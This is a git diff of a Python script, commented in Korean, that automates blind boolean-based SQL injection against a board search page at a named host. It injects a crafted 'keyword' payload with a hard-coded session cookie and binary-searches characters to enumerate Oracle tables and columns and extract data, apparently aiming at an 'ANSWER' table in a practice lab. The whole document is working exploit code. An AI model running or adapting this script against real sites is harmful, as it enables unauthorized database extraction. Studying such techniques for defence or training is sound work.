@@ -27,7 +27,7 @@ import requests
 
 url = 'http://elms1.skinfosec.co.kr:8082/community6/free'
 param = {"searchType" : "all", "keyword" : "yahoo"}
-jsession = {'JSESSIONID':'00B70B25BE74FAB4DE26E3F0ADA1CDE4'}
+jsession = {'JSESSIONID':'E81B282480BF2E8CB3A5FB09DD77ED29'}
 contype = {'Content-Type':'application/x-www-form-urlencoded'}
 
 keyword = "yahoo%' and {} and '1%'='1"
@@ -36,7 +36,7 @@ keyword = "yahoo%' and {} and '1%'='1"
 def binary_search(query, keyword):
     min = 1
     max = 127
-    query = query + " > {}"
+    query += " > {}"
     while min != max :
         avg = int( ( min + max ) / 2 )
         query_modify = query.format(avg)
@@ -57,9 +57,9 @@ def count_table():
     return result
 
 # 테이블명, 길이
-def table_name(table_num):
+def table_name(table_count):
     query = '(select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum={})'
-    for i in range(1, table_num + 1):
+    for i in range(1, table_count + 1):
         query_modify = query.format(i)
         length_table = binary_search(query_modify, keyword)
         
@@ -115,6 +115,7 @@ def count_data(table_name, column_name):
         query_modify = query.format(table_name, column_list[i])
         count_data = binary_search(query_modify, keyword)
         print(f'{i+1}번째 컬럼 데이터 개수 : {count_data}')
+        data_count_list.append(count_data)
     return 
 
 def extract_data(table_name, column_name, data_count):
@@ -128,7 +129,9 @@ def extract_data(table_name, column_name, data_count):
         for j in range(0, data_count_list[i]):
            query_modify = query.format(column_name_list[i], table_name, j+1)
            length_data = binary_search(query_modify, keyword)
-           print(f'{column_name_list[i]} 컬럼에서 {j+1}번째 데이터의 길이 : {length_data}')
+           
+           if(column_name_list[i] == 'ANSWER'):
+            print(f'{column_name_list[i]} 컬럼에서 {j+1}번째 데이터의 길이 : {length_data}')
 
            result_data_name = ''
 
@@ -138,32 +141,46 @@ def extract_data(table_name, column_name, data_count):
                 find_data_name = binary_search(data_query_modify, keyword)
 
                 result_data_name += chr(find_data_name)
-        print(f'{column_name_list[i]} 컬럼에서 {j+1}번째 데이터의 이름 : {result_data_name}')
+        if(column_name_list[i] == 'ANSWER'):
+            print(f'{column_name_list[i]} 컬럼에서 {j+1}번째 데이터의 이름 : {result_data_name}')
+            break
 
     return
 
 ######### MAIN ###################
-# test = count_table()
 
-# table_name_list = []
-# test2 = table_name(test)
+# --- table ---
+# table 개수 확인
+count_table = count_table()
+# table name을 list 저장
+table_name_list = []
+table_name = table_name(count_table)
 
-# test3 = None
-# for item in table_name_list:
-#     if item == 'ANSWER':
-#         test3 = count_table_columns(item)
-# # column_list = [ANSWER, RED_DT, REG_ACCT_ID, UDT_DT, UDT_ACCT_ID]
-# column_name_list = []
-# test4 = table_columns_name(item, test3)
 
-table = 'ANSWER'
-column = ['ANSWER', 'RED_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID']
-count = [1, 1, 1, 1, 1]
-# test5 = count_data(test2, column_name_list)
-test6 = extract_data(table, column, count)
-column_data_length_list = []
-# column_count = []
-# test4 = table_columns_name(test2, test3)
-# column_list = [ANSWER, RED_DT, REG_ACCT_ID, UDT_DT, UDT_ACCT_ID]
+# --- column ---
+# table name == ANSWER 이면, ANSWER table의 column 개수 확인
+column_count = None
+for item in table_name_list:
+    if item == 'ANSWER':
+        column_count = count_table_columns(item)
+        table_name = item
+        # column_list = [ANSWER, RED_DT, REG_ACCT_ID, UDT_DT, UDT_ACCT_ID]
+        # table = 'ANSWER'
+        # count = [1, 1, 1, 1, 1]
+        
+# column name list 저장
+column_name_list = []
+column_name = table_columns_name(table_name, column_count)
 
-data_length = [4, 1, 13, 9, 13]
+
+# --- data ---
+# data 개수 확인
+data_count_list = []
+data_count = count_data(table_name, column_name_list)
+
+# column_name == 'ANSWER' 이면, 데이터 길이, 이름 출력
+data_extract = extract_data(table_name, column_name_list, data_count_list)
+# data_length = [4, 1, 13, 9, 13]
+
+# table_name = 'ANSWER'
+# column_name_list = ['ANSWER', 'RED_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID']
